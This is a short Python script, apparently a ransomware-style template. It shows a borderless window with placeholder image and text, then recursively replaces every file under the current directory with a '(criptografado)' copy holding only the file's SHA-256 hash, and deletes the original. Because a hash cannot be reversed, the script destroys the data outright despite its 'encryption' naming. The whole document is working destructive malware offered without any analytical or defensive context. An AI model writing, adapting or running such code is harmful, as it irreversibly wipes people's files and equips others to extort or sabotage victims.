import hashlib
import os
import tkinter as tk
from PIL import ImageTk, Image

window = tk.Tk()

img = Image.open("YOUR IMAGE")
img = img.resize((400, 400), Image.ANTIALIAS)
img_tk = ImageTk.PhotoImage(img)

window.resizable(False, False)
window.overrideredirect(True)

label = tk.Label(window, image=img_tk)
label.pack()

label = tk.Label(window, text="YOUR TEXT")
label.pack()

diretorio = (os.getcwd())

os.chdir(diretorio)

def processar_arquivo(arquivo):
    with open(arquivo,'rb') as rb:
        dados = rb.read()
        criptografar = hashlib.sha256(dados).hexdigest()
        criptografado = '(criptografado)' + os.path.basename(arquivo)
        caminho_criptografado = os.path.join(os.path.dirname(arquivo), criptografado)
        with open(caminho_criptografado, 'wb') as novo:
            novo.write(str.encode(criptografar))
            novo.close()
            rb.close()

            os.remove(arquivo)

def percorrer_pastas(diretorio):
    for item in os.listdir(diretorio):
        caminho = os.path.join(diretorio, item)
        if os.path.isdir(caminho):
            percorrer_pastas(caminho)
        else:
            processar_arquivo(caminho)

        if os.path.isfile(caminho):
            processar_arquivo(caminho)

percorrer_pastas(diretorio)

window.mainloop()
